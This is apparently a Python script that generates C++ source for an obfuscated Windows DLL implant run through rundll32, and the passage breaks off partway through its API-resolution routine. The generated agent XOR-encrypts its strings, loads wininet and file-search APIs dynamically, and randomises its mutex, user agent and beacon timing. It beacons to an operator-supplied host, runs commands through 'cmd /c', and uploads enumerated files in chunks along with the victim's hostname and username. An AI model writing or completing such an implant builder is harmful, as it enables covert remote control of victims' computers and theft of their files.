content = r'''
import random, string, sys

XOR_KEY = random.randint(1, 255)

def xor_str(s):
    return bytes([ord(c) ^ XOR_KEY for c in s])

def c_array(b):
    return '{' + ','.join(str(x) for x in b) + '}'

def add_null(s):
    return s + '\x00'

def rand_str(n, prefix=''):
    chars = string.ascii_letters + string.digits
    return prefix + ''.join(random.choice(chars) for _ in range(n))

UA_POOL = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0',
]

host = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
port = sys.argv[2] if len(sys.argv) > 2 else '8443'

MUTEX_NAME   = rand_str(16, 'Global\\')
LOG_NAME     = rand_str(8) + '.tmp'
USER_AGENT   = random.choice(UA_POOL)
STARTUP_MIN  = random.randint(30, 90)
BEACON_BASE  = random.randint(8, 15)
BEACON_JIT   = random.randint(3, 8)
UPLOAD_BASE  = random.randint(150, 300)
UPLOAD_JIT   = random.randint(100, 400)

strings = {
    'host': add_null(host), 'port': add_null(port),
    'path_beacon': add_null('/beacon'),
    'path_upload_init': add_null('/upload_init'),
    'path_upload_chunk': add_null('/upload_chunk'),
    'ua': add_null(USER_AGENT),
    'mutexname': add_null(MUTEX_NAME),
    'logname': add_null(LOG_NAME),
    'cmdprefix': add_null('cmd /c '),
    'dll_wininet': add_null('wininet.dll'),
    'dll_advapi32': add_null('advapi32.dll'),
    'dll_shell32': add_null('shell32.dll'),
    'dll_kernel32': add_null('kernel32.dll'),
    'dll_ole32': add_null('ole32.dll'),
    'api_InternetOpenA': add_null('InternetOpenA'),
    'api_InternetConnectA': add_null('InternetConnectA'),
    'api_HttpOpenRequestA': add_null('HttpOpenRequestA'),
    'api_HttpSendRequestA': add_null('HttpSendRequestA'),
    'api_InternetReadFile': add_null('InternetReadFile'),
    'api_InternetCloseHandle': add_null('InternetCloseHandle'),
    'api_InternetSetOptionA': add_null('InternetSetOptionA'),
    'api_CreateMutexA': add_null('CreateMutexA'),
    'api_GetLastError': add_null('GetLastError'),
    'api_CoCreateGuid': add_null('CoCreateGuid'),
    'api_SHCreateDirectoryExA': add_null('SHCreateDirectoryExA'),
    'api_FindFirstFileA': add_null('FindFirstFileA'),
    'api_FindNextFileA': add_null('FindNextFileA'),
    'api_FindClose': add_null('FindClose'),
    'api_GetLogicalDriveStringsA': add_null('GetLogicalDriveStringsA'),
    'api_GetDriveTypeA': add_null('GetDriveTypeA'),
    'field_guid': add_null('guid'),
    'field_hostname': add_null('hostname'),
    'field_username': add_null('username'),
    'field_result_b64': add_null('result_b64'),
    'field_seq': add_null('seq'),
    'field_filename': add_null('filename'),
    'field_total_size': add_null('total_size'),
    'field_offset': add_null('offset'),
    'field_chunk_b64': add_null('chunk_b64'),
    'field_status': add_null('status'),
    's_dot': add_null('.'),
    's_dot2': add_null('..'),
    's_dir': add_null('*'),
    's_backslash': add_null(chr(92)),
    's_slash': add_null('/'),
}

enc = {k: c_array(xor_str(v)) for k, v in strings.items()}

def enc_len(s):
    return len(xor_str(s))

parts = []
p = parts.append

p(f'// Auto-generated DLL agent for rundll32')
p(f'// XOR key: {XOR_KEY}')
p(f'// Host: {host}:{port}')
p(f'// Mutex: {MUTEX_NAME}')
p(f'// Startup delay: {STARTUP_MIN}s')
p(f'// Beacon: {BEACON_BASE}s +/- {BEACON_JIT}s')
p(f'// Upload: {UPLOAD_BASE}ms +/- {UPLOAD_JIT}ms')
p('#include <windows.h>')
p('#include <wininet.h>')
p('#include <string>')
p('#include <cstring>')
p('#include <ctime>')
p('#include <stdio.h>')
p('#include <vector>')
p('#include <stdarg.h>')
p('#include <stdlib.h>')
p('')
p(f'static const unsigned char XOR_KEY = {XOR_KEY};')
p('')

for k, v in strings.items():
    arr = enc[k]
    n = enc_len(v.strip('\x00'))
    p(f'static unsigned char _e_{k}[{n}] = {arr};')

p('')
p('struct API {')
p('    HMODULE hWininet, hAdvapi, hShell32, hKernel32, hOle32;')
p('    HINTERNET (WINAPI *f_InternetOpenA)(LPCSTR,DWORD,LPCSTR,LPCSTR,DWORD);')
p('    HINTERNET (WINAPI *f_InternetConnectA)(HINTERNET,LPCSTR,INTERNET_PORT,LPCSTR,LPCSTR,DWORD,DWORD,DWORD_PTR);')
p('    HINTERNET (WINAPI *f_HttpOpenRequestA)(HINTERNET,LPCSTR,LPCSTR,LPCSTR,LPCSTR,LPCSTR*,DWORD,DWORD_PTR);')
p('    BOOL (WINAPI *f_HttpSendRequestA)(HINTERNET,LPCSTR,DWORD,LPVOID,DWORD);')
p('    BOOL (WINAPI *f_InternetReadFile)(HINTERNET,LPVOID,DWORD,LPDWORD);')
p('    BOOL (WINAPI *f_InternetCloseHandle)(HINTERNET);')
p('    BOOL (WINAPI *f_InternetSetOptionA)(HINTERNET,DWORD,LPVOID,DWORD);')
p('    HANDLE (WINAPI *f_CreateMutexA)(LPSECURITY_ATTRIBUTES,BOOL,LPCSTR);')
p('    DWORD (WINAPI *f_GetLastError)();')
p('    HRESULT (WINAPI *f_CoCreateGuid)(GUID*);')
p('    int (WINAPI *f_SHCreateDirectoryExA)(HWND,LPCSTR,LPSECURITY_ATTRIBUTES);')
p('    HANDLE (WINAPI *f_FindFirstFileA)(LPCSTR,LPWIN32_FIND_DATAA);')
p('    BOOL (WINAPI *f_FindNextFileA)(HANDLE,LPWIN32_FIND_DATAA);')
p('    BOOL (WINAPI *f_FindClose)(HANDLE);')
p('    DWORD (WINAPI *f_GetLogicalDriveStringsA)(DWORD,LPSTR);')
p('    UINT (WINAPI *f_GetDriveTypeA)(LPCSTR);')
p('} _api = {0};')
p('')
p('static void s_copy(char* dst, const unsigned char* src, size_t n) {')
p('    for(size_t i = 0; i < n - 1; i++) dst[i] = src[i] ^ XOR_KEY;')
p('    dst[n - 1] = 0;')
p('}')
p('')
p('static bool _resolve_apis() {')
p('    char n1[32]; s_copy(n1, _e_dll_wininet, sizeof(_e_dll_wininet));')
p('    _api.hWininet = LoadLibraryA(n1); if(!_api.hWininet) return false;')
p('    char n2[32]; s_copy(n2, _e_dll_advapi32, sizeof(_e_dll_advapi32));')
p('    _api.hAdvapi = LoadLibraryA(n2); if(!_api.hAdvapi) return false;')
p('    char n3[32]; s_copy(n3, _e_dll_shell32, sizeof(_e_dll_shell32));')
p('    _api.hShell32 = LoadLibraryA(n3); if(!_api.hShell32) return false;')
p('    char n4[32]; s_copy(n4, _e_dll_kernel32, sizeof(_e_dll_kernel32));')
p('    _api.hKernel32 = LoadLibraryA(n4); if(!_api.hKernel32) return false;')
p('    char n5[32]; s_copy(n5, _e_dll_ole32, sizeof(_e_dll_ole32));')
p('    _api.hOle32 = LoadLibraryA(n5); if(!_api.hOle32) return false;')
p('    char n6[32]; s_copy(n6, _e_api_InternetOpenA, sizeof(_e_api_InternetOpenA));')
p('    _api.f_InternetOpenA = (decltype(_api.f_InternetOpenA))GetProcAddress(_api.hWininet, n6);')
p('    char n7[32]; s_copy(n7, _e_api_InternetConnectA, sizeof(_e_api_InternetConnectA));')
p('    _api.f_InternetConnectA = (decltype(_api.f_InternetConnectA))GetProcAddress(_api.hWininet, n7);')
p('    char n8[32]; s_copy(n8, _e_api_HttpOpenRequestA, sizeof(_e_api_HttpOpenRequestA));')
p('    _api.f_HttpOpenRequestA = (decltype(_api.f_HttpOpenRequestA))GetProcAddress(_api.hWininet, n8);')
p('    char n9[32]; s_copy(n9, _e_api_HttpSendRequestA, sizeof(_e_api_HttpSendRequestA));')
p('    _api.f_HttpSendRequestA = (decltype(_api.f_HttpSendRequestA))GetProcAddress(_api.hWininet, n9);')
p('    char n10[32]; s_copy(n10, _e_api_InternetReadFile, sizeof(_e_api_InternetReadFile));')
p('    _api.f_InternetReadFile = (decltype(_api.f_InternetReadFile))GetProcAddress(_api.hWininet, n10);')
p('    char n11[32]; s_copy(n11, _e_api_InternetCloseHandle, sizeof(_e_api_InternetCloseHandle));')
p('    _api.f_InternetCloseHandle = (decltype(_api.f_InternetCloseHandle))GetProcAddress(_api.hWininet, n11);')
p('    char n12[32]; s_copy(n12, _e_api_InternetSetOptionA, sizeof(_e_api_InternetSetOptionA));')
p('    _api.f_InternetSetOptionA = (decltype(_api.f_InternetSetOptionA))GetProcAddress(_api.hWininet, n12);')
p('    char n13[32]; s_copy(n13, _e_api_CreateMutexA, sizeof(_e_api_CreateMutexA));')
p('    _api.f_CreateMutexA = (decltype(_api.f_CreateMutexA))GetProcAddress(_api.hAdvapi, n13);')
p('    char n14[32]; s_copy(n14, _e_api_GetLastError, sizeof(_e_api_GetLastError));')
p('    _api.f_GetLastError = (decltype(_ap
